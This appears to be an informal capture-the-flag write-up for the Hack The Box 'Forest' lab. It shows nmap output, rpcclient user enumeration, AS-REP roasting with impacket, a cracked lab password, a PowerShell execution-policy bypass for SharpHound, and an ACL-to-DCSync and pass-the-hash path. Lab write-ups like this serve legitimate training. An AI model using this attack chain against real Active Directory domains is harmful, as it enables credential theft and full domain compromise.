@@ -1,0 +1,133 @@
+so we begin by doing an nmap classic scan + save i.e (nmap -sC -sV -oA forest.htb2 10.10.10.161) 
+
+and the output is:
+
+Host is up (0.77s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-10 10:14:42Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m49s, deviation: 4h02m33s, median: 6m47s
+| smb2-time: 
+|   date: 2023-07-10T10:15:07
+|_  start_date: 2023-07-10T10:11:23
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-07-10T03:15:11-07:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 129.69 seconds
+
+
+so I do not gain access through simple DNS BUT I fast forward to do an enumeration to the port 135 which is rpcclient and with enumdomusers Im able to get the domain users which in turn I can use for asrep roasting
+
+when I use enumdomusers I am able to obtain the domain users 
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+
+using the command cat usersnames | cut -d "[" -f2 | cut -d "]" -f1 | sort | uniq we are able to obatain the users in there having removed unecessary info 
+
+$331000-VK4ADACQNUCA
+Administrator
+andy
+DefaultAccount
+Guest
+HealthMailbox0659cc1
+HealthMailbox670628e
+HealthMailbox6ded678
+HealthMailbox7108a4e
+HealthMailbox83d6781
+HealthMailbox968e74d
+HealthMailboxb01ac64
+HealthMailboxc0a90c9
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxfd87238
+krbtgt
+lucinda
+mark
+santi
+sebastien
+SM_1b41c9286325456bb
+SM_1ffab36a2f5f479cb
+SM_2c8eef0a09b545acb
+SM_681f53d4942840e18
+SM_75a538d3025e4db9a
+SM_7c96b981967141ebb
+SM_9b69f1b9d2cc45549
+SM_c75ee099d0a64c91b
+SM_ca8c2ed5bdab4dc9b
+svc-alfresco
+
+so using the users we have we do ASREPROASTING that is 
+
+impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -request
+
+we obtain the hash and using johntheripper we obtain the plaintext password that is s3rvice from the user svc-alfresco
+
+now we test  whether we can gain access through winrm which we see it possible when we check with crackmapexec 
+
+
+
+now that we are in the box as users... we upload sharp hound and we execute it using 
+
+powershell.exe -ExecutionPolicy Bypass -File SharpHound.ps1
+
+the reason we do this is because we want to bypass the security restrictions imposed on running our powershell script
+
+we do this and get the map... we check then we realise we have privs of adding a user to the domain and group exchange windows permissions... once we are here we have WriteACL(access control lists) privs so we can write the access controll lists privs to be DCSync rights... we perform a DCSync attack using impacket-secretsdump and boom we get the hash belonging to the admin.... the DCSync attack takes advantage of DRS replication process... Domain Replication Service is a service that is used by domain controllers to replicate the  domain information of domain controllers within a domain  after getting the hash we do a passthehash attack... this happens because since maybe the domain computers might have the cached hash of the password in their memory and when prompted it enables someone to authenticate without any issues
